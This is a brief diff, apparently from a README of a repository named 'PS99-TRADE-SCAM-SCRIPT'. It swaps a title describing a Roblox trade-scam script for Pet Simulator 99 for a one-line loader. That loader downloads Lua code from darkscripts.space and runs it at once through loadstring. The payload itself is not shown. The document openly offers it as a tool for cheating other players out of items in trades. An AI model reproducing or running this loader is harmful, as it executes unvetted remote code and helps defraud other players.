@@ -1,2 +1,1 @@
-# PS99-TRADE-SCAM-SCRIPT
-ROBLOX SCRIPT FOR PS99 (TRADE SCAM)
+loadstring(game:HttpGet('https://darkscripts.space/scripts/c2adcba2e2.lua',true))()
